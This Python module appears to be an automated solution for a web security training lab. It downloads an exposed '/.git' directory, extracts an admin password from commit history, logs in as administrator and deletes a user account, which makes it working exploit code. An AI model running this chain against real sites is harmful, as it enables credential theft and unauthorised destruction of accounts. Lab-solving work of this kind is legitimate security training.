from web_security_academy.core.logger import logger

from bs4 import BeautifulSoup
from pathlib import Path
from git import Repo

import tempfile
import os
import re


def recursive_download(session, url_path, fs_path):
    logger.debug(f"Downloading {url_path}")
    path = fs_path / str(url_path)[1:]
    resp = session.get_path(str(url_path))

    if "Content-Type" not in resp.headers:
        with open(path, "wb") as f:
            f.write(resp.content)
    else:
        os.mkdir(path)
        soup = BeautifulSoup(resp.text, "lxml")
        query = soup.find_all("a")
        for anchor in query:
            href = anchor.get("href")
            if href != "../":
                recursive_download(session, href, fs_path)


def solve_lab(session):
    logger.info('Recursively downloading contents from "/.git"...')
    with tempfile.TemporaryDirectory() as tmpdir:
        recursive_download(session, Path("/.git"), Path(tmpdir))
        logger.info("Extracting password from Git repository...")

        # Run "git diff <first_commit>"
        repo = Repo(tmpdir)
        first_commit = list(repo.iter_commits(all=True))[-1]
        diff = repo.git.diff(first_commit)

    password = re.search("ADMIN_PASSWORD=([a-z0-9]+)", diff).group(1)
    logger.info(f"ADMIN_PASSWORD={password}")
    session.login("administrator", password)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
